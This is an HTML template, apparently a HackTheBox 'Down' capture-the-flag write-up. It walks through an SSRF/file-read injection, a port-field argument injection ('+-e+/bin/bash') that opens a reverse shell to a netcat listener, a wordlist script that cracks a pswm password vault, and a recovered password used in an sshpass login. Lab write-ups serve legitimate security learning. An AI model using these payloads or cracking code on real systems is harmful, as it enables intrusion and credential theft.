@@ -1,0 +1,160 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HTB Down</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/machines/machines.css' %}"> 
+</head>
+<body>
+    <h1 class="title">HTB Down</h1>
+    <h2 class="subtitle">Enumeration</h2>
+
+    <div class="code-box"><pre><code>sudo nmap -p- -sCV TARGET_IP --min-rate=2000 > nmap.txt</code></pre></div>
+
+    <div class="img">
+        <img src="{% static 'EthHack/images/down/1-nmap.png' %}" alt="">
+        <p class="text">Basic output. The machine opens http and ssh. Let's observe the webpage and look for foothold.</p>
+    </div>
+
+    <div class="img">
+        <img src="{% static 'EthHack/images/down/2-site.png' %}" alt="">
+        <p class="text">The page check if the webserver is down by requesting to other website from the server. It's possible that the input field is vulnerable to LFI or SSRF. <br><br>Let's check if we can exploit.</p>
+    </div>
+
+    <div class="img">
+        <img src="{% static 'EthHack/images/down/3-LFI.png' %}" alt="">
+        <p class="text">As expected, the request data can be used for LFI and I could see contents of /etc/passwd with url data <u>http://127.0.0.1+file:///etc/passwd</u>.</p>
+    </div>
+
+    <p class="text">This output is not intuitive, but if we can imagine php code and what bash code is used, the mechanism is really easy.</p>
+    <p class="text">At first, when we input only <u>file:///etc/passwd</u>, it returns error. However, when it comes to <u>http://127.0.0.1:80</u>, it doesn't. Therefore, we can predict the php checks if the first string is 'http://' or 'https://'.</p>
+    <p class="text">Also, when we catch contents of some webpage, we use <u>curl</u> command on bash. Additionally, we can give it multiple argument. For example,</p>
+    <div class="code-box">
+        <pre><code>curl http://127.0.0.1:8000 http://127.0.0.1:80</code></pre>
+    </div>
+    <p class="text">This command returns both pages' contents. Then, when we can use url data like 'http://127.0.0.1+file:///etc/passwd', becuase + would be replaced with space cuz it is url encoded.</p>
+
+    <p class="text"><strong>NOTE</strong> : <u>file://localhost/etc/passwd</u> is ok, but we can exclude localhost in this case.</p>
+
+    <h2 class="subtitle">Foothold</h2>
+    <div class="img">
+        <img src="{% static 'EthHack/images/down/4-php.png' %}" alt="">
+        <p class="text">Then, to get more information, let's read php code. We can fetch <u>http://127.0.0.1+file:///var/www/html/index.php</u>. This is common webpage structure.</p>
+    </div>
+
+    <div class="img">
+        <img src="{% static 'EthHack/images/down/5-decode.png' %}" alt="">
+        <p class="text">The output of request above is html encoded, so we need to decode it with burpsuite's decode function.</p>
+    </div>
+
+    <p class="text">Look at this snippet.</p>
+    <img src="{% static 'EthHack/images/down/5-5-code.png' %}" alt="" id="big">
+    <p class="text">It tells us there is 'expertmode'. Let's try exploiting it.</p>
+
+    <div class="img">
+        <img src="{% static 'EthHack/images/down/6-expert.png' %}" alt="">
+        <p class="text">As you can see, there are two input boxes. The first one is for ip, and second one is for port number. <br><br>
+        It looks like new page, but please note that the php code this page using is the same as before. Therefore, we might be able to exploit this page with SSRF.</p>
+    </div>
+
+    <div class="code-box"><pre><code>nc -lvnp PORT</code></pre></div>
+    <div class="img">
+        <img src="{% static 'EthHack/images/down/7-rev.png' %}" alt="">
+        <p class="text">We set ip data '<u>OUR_IP</u>' and port data '<u>OUR_PORT+-e+/bin/bash</u>'</p>
+    </div>
+
+    <div class="img">
+        <img src="{% static 'EthHack/images/down/8-connection.png' %}" alt="">
+        <p class="text">We could establish reverse-shell connection.</p>
+    </div>
+
+    <h2 class="subtitle">Privilege Escalation</h2>
+    <p class="text">Before start Privilege Escalation, let's make this connection stable.</p>
+    <div class="code-box"><pre><code>script /dev/null -c /bin/bash
+    ^Z
+$ stty raw -echo; fg
+nc -lnvp IP
+‍            reset
+reset: unknown terminal type unknown
+Terminal type? screen
+www-data@down:/var/www/html$ </code></pre></div>
+
+        <div class="img">
+            <img src="{% static 'EthHack/images/down/9-find.png' %}" alt="">
+            <p class="text">We can access 'aleks' home directory, although we cannot see what's exactly inside. <br><br>
+            However, there is an interesting file <u>pswm/pswm</u>. </p>
+        </div>
+        <div class="code-box"><pre><code>aleks@down:~$ cat /home/aleks/.local/share/pswm/pswm
+e9laWoKiJ0OdwK05b3hG7xMD+uIBBwl/v01lBRD+pntORa6Z/Xu/TdN3aG/ksAA0Sz55/kLggw==*xHnWpIqBWc25rrHFGPzyTg==*4Nt/05WUbySGyvDgSlpoUw==*u65Jfe0ml9BFaKEviDCHBQ==</code></pre></div>
+        <p class="text">This is hard encrypted, and we cannot see what's the original string.</p>
+        <p class="text">Therefore, we need to find the way to decode this string.</p>
+
+        <div class="code-box"><pre><code>$ which pswm
+/usr/bin/pswm</code></pre></div>
+            <p class="text">And research the keyword '/usr/bin/pswm', there was this <a href="https://github.com/Julynx/pswm">page</a>.</p>
+
+            <p class="text">Reading this page, I noticed that we can decrypt password vault. Read this code carefully</p>
+            <div class="code-box"><pre><code>
+def encrypted_file_to_lines(file_name, master_password):
+    """
+    This function opens and <u>decrypts the password vault.</u>
+
+    Args:
+        file_name (str): The name of the file containing the password vault.
+        master_password (str): The master password to use to decrypt the
+        password vault.
+
+    Returns:
+        list: A list of lines containing the decrypted passwords.
+    """
+    if not os.path.isfile(file_name):
+        return ""
+
+    with open(file_name, 'r') as file:
+        encrypted_text = file.read()
+
+    decrypted_text = cryptocode.decrypt(encrypted_text, master_password)
+    if decrypted_text is False:
+        return False
+
+    decrypted_lines = decrypted_text.splitlines()
+    return decrypted_lines
+</code></pre></div>
+    <p class="text">This snippet tells us cryptcode.dexrypt takes two arguments "encrypted_text" and "master_password".</p>
+    <p class="text">It probably compares encrypted_text and encrypted master_password(raw string). We can create decryption code easily.</p>
+
+    <div class="code-box"><pre><code>import cryptocode
+import sys
+
+encrypted = 'e9laWoKiJ0OdwK05b3hG7xMD+uIBBwl/v01lBRD+pntORa6Z/Xu/TdN3aG/ksAA0Sz55/kLggw==*xHnWpIqBWc25rrHFGPzyTg==*4Nt/05WUbySGyvDgSlpoUw==*u65Jfe0ml9BFaKEviDCHBQ=='
+
+with open(sys.argv[1], 'rb') as f:
+    passwords = f.read().decode(errors='ignore').split('\n')
+    
+
+for password in passwords:
+        arg = encrypted
+        decrypted = cryptocode.decrypt(arg, password.strip())
+        if (decrypted):
+            print(f"Found password: {password}")
+            print(decrypted)
+            break</code></pre></div>
+
+        <div class="code-box"><pre><code>┌──(venv)─(usrname㉿usrname)-[~/tempo]
+└─$ python3 dectypt.py /usr/share/wordlists/rockyou.txt
+
+Found password: flower
+pswm    aleks   flower
+aleks@down      aleks   1uY3w22uc-Wr{xNHR~+E
+</code></pre></div>
+    <p class="text"><strong>NOTE</strong> : install cryptocode module before you run this code.</p>
+    <p class="text">If you are interested in the decrypt.py, please visit <a href="{% url 'decrypt_py' %}">HERE</a></p>
+
+    <div class="code-box"><pre><code>$ su aleks</code></pre></div>
+    <p class="text">or</p>
+    <div class="code-box">$sshpass -p '1uY3w22uc-Wr{xNHR~+E' ssh aleks@TARG_IP</div>
+    <img src="{% static 'EthHack/images/down/12-sudo.png' %}" id="big" alt="">
+</body>
+</html>
